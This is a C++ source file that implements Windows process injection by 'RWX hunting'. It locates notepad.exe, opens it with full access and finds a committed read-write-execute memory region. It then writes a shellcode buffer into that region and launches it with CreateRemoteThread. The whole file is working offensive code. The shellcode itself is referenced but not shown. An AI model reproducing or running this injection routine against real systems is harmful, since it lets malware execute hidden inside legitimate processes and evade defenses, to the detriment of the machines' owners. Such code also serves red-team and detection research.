#include "utils.h"
#include "rwx_hunting_injection.h"
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

LPVOID FindRWXMemoryRegion(HANDLE hProcess) {
    MEMORY_BASIC_INFORMATION mbi;
    unsigned char* address = 0;

    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
        if ((mbi.Protect & PAGE_EXECUTE_READWRITE) && (mbi.State == MEM_COMMIT)) {
            return mbi.BaseAddress; // Return the first RWX region found
        }
        address += mbi.RegionSize;
    }

    return NULL; // No RWX memory region found
}

void RWXHuntingInjection() {
    const wchar_t* targetProcessName = L"notepad.exe";

    // Get the PID of the target process
    DWORD processId = GetProcessIdByName(targetProcessName);
    if (processId == 0) {
        std::cerr << "Target process not found." << std::endl;
        return;
    }

    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        std::cerr << "Failed to open target process." << std::endl;
        return;
    }

    // Find an RWX memory region
    LPVOID pRWXRegion = FindRWXMemoryRegion(hProcess);
    if (!pRWXRegion) {
        std::cerr << "No RWX memory region found in the target process." << std::endl;
        CloseHandle(hProcess);
        return;
    }

    std::cout << "Found RWX memory region at: " << pRWXRegion << std::endl;

    // Write the shellcode into the RWX memory region
    if (!WriteProcessMemory(hProcess, pRWXRegion, sc, sizeof(sc), NULL)) {
        std::cerr << "Failed to write shellcode to RWX memory region." << std::endl;
        CloseHandle(hProcess);
        return;
    }

    // Create a remote thread to execute the shellcode
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRWXRegion, NULL, 0, NULL);
    if (!hRemoteThread) {
        std::cerr << "Failed to create remote thread." << std::endl;
        CloseHandle(hProcess);
        return;
    }

    std::cout << "Shellcode executed in the target process." << std::endl;

    // Wait for the remote thread to finish
    WaitForSingleObject(hRemoteThread, INFINITE);

    // Cleanup
    CloseHandle(hRemoteThread);
    CloseHandle(hProcess);
}